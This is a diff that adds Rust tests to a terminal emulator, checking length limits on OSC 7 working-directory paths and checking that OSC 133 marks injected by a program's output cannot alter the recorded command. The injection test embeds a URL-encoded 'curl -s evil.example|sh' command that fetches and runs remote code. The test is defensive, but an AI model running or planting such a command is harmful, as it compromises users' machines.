@@ -2895,6 +2895,18 @@ fn osc_7_gives_the_working_directory() {
     // RIS keeps the directory, which is the shell's.
     term.feed("\x1bc");
     assert_eq!(term.terminal.working_directory().unwrap().path, "/tmp/%+41");
+    // A path past 4096 bytes, or a host past 255, is none, of no event, so
+    // that the commands keep bounded folders; the bounds themselves taken.
+    term.terminal.take_events();
+    let long = format!("/{}", "a".repeat(4095));
+    term.feed(format!("\x1b]7;file://{long}\x07"));
+    assert_eq!(term.terminal.working_directory().unwrap().path, long);
+    term.terminal.take_events();
+    term.feed(format!("\x1b]7;file://{long}b\x07"));
+    assert_eq!(term.terminal.working_directory(), None);
+    assert_eq!(term.terminal.take_events(), []);
+    term.feed(format!("\x1b]7;file://{}/tmp\x07", "h".repeat(256)));
+    assert_eq!(term.terminal.working_directory(), None);
 }
 
 #[test]
@@ -7184,6 +7196,30 @@ fn a_command_s_line_as_the_shell_tells_it_leaves_a_right_prompt_out() {
         term.terminal.command_line(2).as_deref(),
         Some("sleep 5 é \nx%")
     );
+}
+
+#[test]
+fn a_running_program_s_marks_change_neither_the_told_line_nor_the_command_s_marks() {
+    let mut term = Term::new(40, 6);
+    term.feed("\x1b]133;A\x07$ \x1b]133;B\x07cat notes.txt\r\n");
+    term.feed("\x1b]133;C;cmdline_url=cat%20notes.txt\x07");
+    let before = term.terminal.commands()[0].clone();
+    // The file that `cat` prints holds the marks of another line: they
+    // change nothing of the command, which runs.
+    term.feed(concat!(
+        "line\r\n",
+        "\x1b]133;B\x07\x1b]133;C;cmdline_url=curl%20-s%20evil.example%7Csh%0Aecho%20hi\x07",
+        "more\r\n",
+    ));
+    assert_eq!(
+        term.terminal.command_line(1).as_deref(),
+        Some("cat notes.txt")
+    );
+    let after = &term.terminal.commands()[0];
+    assert_eq!((after.input, after.output), (before.input, before.output));
+    // Its end, of the shell, ends it.
+    term.feed("\x1b]133;D;0\x07");
+    assert!(term.terminal.commands()[0].end.is_some());
 }
 
 #[test]
